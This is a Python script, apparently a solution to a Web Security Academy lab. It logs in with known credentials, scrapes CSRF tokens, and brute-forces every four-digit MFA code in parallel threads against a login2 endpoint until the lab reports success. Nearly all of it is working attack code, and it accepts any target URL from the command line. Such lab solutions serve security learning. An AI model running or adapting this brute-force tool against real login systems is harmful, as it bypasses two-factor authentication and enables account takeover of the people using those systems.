import requests
from bs4 import BeautifulSoup
import sys
from multiprocessing.dummy import Pool
import random



def Req1(url):
    req = f'''GET /login HTTP/2
Host: {url}
Cookie: session=ugf2tqYkmA2xxibdGzX2kLHcep4Frmsc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a2c007603f6604080f6d52e00910076.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
    '''
    return req

def Req2(session, csrf, url):
    header ={
        
        "Host": f"{url}",
        "Cookie": "session="f"{session}",
        "Content-Length": "70",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not_A Brand"; v=8, Chromium;v=120',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Linux",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://"f'{url}',
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://"f'{url}'"/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Priority": "u=0, i",
    }
    data ={
        'csrf': f"{csrf}",
        'username': 'carlos',
        'password': 'montoya',
    }
    return header, data

def Req3(session, url):
    header ={
        "Host": f"{url}",
        "Cookie": "session="f"{session}",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Sec-Ch-Ua": "'Not_A Brand';v='8', 'Chromium';v='120'",
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Linux",
        "Referer": "https://"f'{url}'"/login",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Priority": "u=0, i",
    }
    return header

def Req4(session, csrf, word, url):
    header ={
        "Host": f"{url}",
        "Cookie": "session="f'{session}',
        "Content-Length": "51",
        "Cache-Control": "max-age=0",
        "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": "Linux",
        "Upgrade-Insecure-Requests": "1",
        "Origin": "https://"f'{url}',
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://"f'{url}'"/login2",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
        "Priority": "u=0, i",  
    }
    data ={
        'csrf': f"{csrf}",
        'mfa-code': f'{word}',
    }
    return header, data


def iterate(i, url, ur):

    response1, response2, response3, response4 = None, None, None, None
    csrf_token = None
    word = '{0:04}'.format(i)
    
    with requests.Session() as session:

        #--------------------------------------------------------------------------------------
        #---Request 1

        try:
            response1 = session.request("GET", url + 'login', data=Req1(ur))
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout):
            raise ValueError(f"No connection!")

        #--extract csrf and session_cookie for the response
        response_soup = BeautifulSoup(response1.text, 'html.parser')
        csrf_input = response_soup.find('input', {'name': 'csrf'})
        if csrf_input:
            csrf_token = csrf_input['value']
        else:
            print('CSRF not found in response.')
        session_cookie = response1.cookies.get('session')
        
        #----------------------------------------------------------------------------------------
        #---Request 2

        try:
            header, data = Req2(session_cookie, csrf_token, ur)
            response2 = session.request("POST", url + 'login', data=data, headers=header, allow_redirects=False)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout):
            raise ValueError(f"No connection!")
            
        #--extract session_cookie
        session_cookie = response2.cookies.get('session')
        
        #----------------------------------------------------------------------------------------
        #---Request 3

        try:
            header= Req3(session_cookie, ur)
            response3 = session.request("GET", url + 'login2', headers=header)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout):
            raise ValueError(f"No connection!")

        #--extract csrf
        response_soup = BeautifulSoup(response3.text, 'html.parser')
        csrf_input = response_soup.find('input', {'name': 'csrf'})
        if csrf_input:
            csrf_token = csrf_input['value']
        else:
            print('CSRF not found in response.')
            
        #----------------------------------------------------------------------------------------
        #---Request 4

        try:
            header, data = Req4(session_cookie, csrf_token, word, ur)
            response4 = session.request("POST", url + 'login2', headers=header, data=data)
        except (requests.exceptions.ConnectionError, requests.exceptions.ReadTimeout):
            raise ValueError(f"No connection!")
        
        #----------------------------------------------------------------------------------------

        #--Condition for break iteration
        if "Congratulations, you solved the lab!" in response4.text:
            print(f"Result of mfa-code {word} : {response1.status_code}, {response2.status_code}, {response3.status_code}, {response4.status_code}")
            raise ValueError(f"You solved the Lab {word} : {response1.status_code}, {response2.status_code}, {response3.status_code}, {response4.status_code}")
        else:
            return f"Result of mfa-code {word} : {response1.status_code}, {response2.status_code}, {response3.status_code}, {response4.status_code}"

        

def urlAdapter(url):
    if "https://" in url:
        url = url.split("https://")[1].strip()
    while url[-1:] == '/':
        url = url[:-1]
    return 'https://'f'{url}/', url

def main(url, ur, iterations):
    with Pool(processes=None) as pool:
        multiple_results = [pool.apply_async(iterate, (i, url, ur)) for i in iterations]
        for res in multiple_results:
            try:
                result = res.get()
                if result:
                    print(result)
            except ValueError as e:
                print(f" {e}")
                pool.terminate()
                break
            except KeyboardInterrupt:
                pool.terminate()
                break


if __name__ == "__main__":
    try:
        arg = sys.argv[1]
    except IndexError:
        print("No URL")
    else:
        url, ur = urlAdapter(arg)
        indices = range(10000)
        iterations = random.sample(indices, len(indices))   # For random indices
        iterations = indices
        main(url, ur, iterations)
    
